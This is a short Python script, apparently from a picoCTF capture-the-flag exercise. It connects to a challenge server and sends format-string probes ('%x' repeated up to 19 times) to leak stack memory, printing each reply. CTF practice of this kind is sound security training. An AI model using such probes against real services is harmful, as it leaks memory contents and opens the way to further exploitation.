import socket
import time

host = "saturn.picoctf.net"
port = 65528

# Connect to the server
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))

# Read the initial prompt
initial_prompt = s.recv(1024).decode()
print("Server says:")
print(initial_prompt)

# Send payloads incrementally
for i in range(1, 20):  # Adjust the range as needed
    payload = ("%x " * i).strip() + "\n"  # Add newline at the end
    print(f"\nSending payload: {payload}")
    s.send(payload.encode())  # Send the payload

    time.sleep(0.5)  # Small delay to allow server to respond

    # Attempt to read the response
    try:
        response = s.recv(4096).decode()  # Increase buffer size for larger responses
        print(f"Response for {i} %x:")
        print(response)
    except Exception as e:
        print(f"Error reading response: {e}")
        break

s.close()
